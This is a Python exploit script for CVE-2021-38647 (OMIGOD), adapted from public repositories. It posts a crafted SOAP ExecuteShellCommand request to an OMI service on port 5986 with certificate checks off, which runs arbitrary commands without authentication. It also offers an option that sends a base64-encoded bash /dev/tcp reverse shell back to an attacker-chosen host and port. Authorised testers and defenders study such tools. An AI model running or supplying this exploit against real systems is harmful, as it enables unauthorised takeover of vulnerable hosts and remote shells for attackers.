#!/usr/bin/python3
# Heavily based on https://github.com/horizon3ai/CVE-2021-38647

import argparse
import re
import requests
import urllib3
import base64
from xml.etree import ElementTree
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# SOAP payload from https://github.com/midoxnet/CVE-2021-38647
DATA = """
   <s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema">
      <s:Header>
         <a:To>HTTP://192.168.1.1:5986/wsman/</a:To>
         <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
         <a:ReplyTo>
            <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
         </a:ReplyTo>
         <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
         <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
         <a:MessageID>uuid:0AB58087-C2C3-0005-0000-000000010000</a:MessageID>
         <w:OperationTimeout>PT1M30S</w:OperationTimeout>
         <w:Locale xml:lang="en-us" s:mustUnderstand="false" />
         <p:DataLocale xml:lang="en-us" s:mustUnderstand="false" />
         <w:OptionSet s:mustUnderstand="true" />
         <w:SelectorSet>
            <w:Selector Name="__cimnamespace">root/scx</w:Selector>
         </w:SelectorSet>
      </s:Header>
      <s:Body>
         <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
            <p:command>{}</p:command>
            <p:timeout>0</p:timeout>
         </p:ExecuteShellCommand_INPUT>
      </s:Body>
   </s:Envelope>
"""

def reverse_shell(target, ip, port):
   rev_shell = f"bash -i &>/dev/tcp/{ip}/{port} <&1".encode("ascii")
   payload = "echo " + base64.b64encode(rev_shell).decode("UTF-8") + " | base64 -d | bash"
   exploit(target, payload)


def exploit(target, command):
    headers = {'Content-Type': 'application/soap+xml;charset=UTF-8'}
    print("Sending payload")
    r = requests.post(f'https://{target}:5986/wsman', headers=headers, data=DATA.format(command), verify=False)
    output = re.search('<p:StdOut>(.*)</p:StdOut>', r.text)
    error = re.search('<p:StdErr>(.*)</p:StdErr>', r.text)
    if output:
        if output.group(1):
            print(output.group(1).rstrip('&#10;'))
    if error:
        if error.group(1):
            print(error.group(1).rstrip('&#10;'))

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='The IP address of the target', required=True)
    parser.add_argument('-r', '--rev-shell', action='store_true', help='Get a /dev/tcp reverse shell')
    parser.add_argument('-l', '--lhost', help='The listen address')
    parser.add_argument('-p', '--lport', help='The listen port')
    parser.add_argument('-c', '--command', help='The command to run')
    args = parser.parse_args()

    if args.rev_shell and args.command:
       parser.error("--rev-shell and --command can't be used together")
    if args.command:
       exploit(args.target, args.command)
    if args.rev_shell:
       if (args.lhost is None or args.lport is None):
            parser.error("--rev-shell requires --lhost and --lport.")
       else:
          reverse_shell(args.target, args.lhost, args.lport)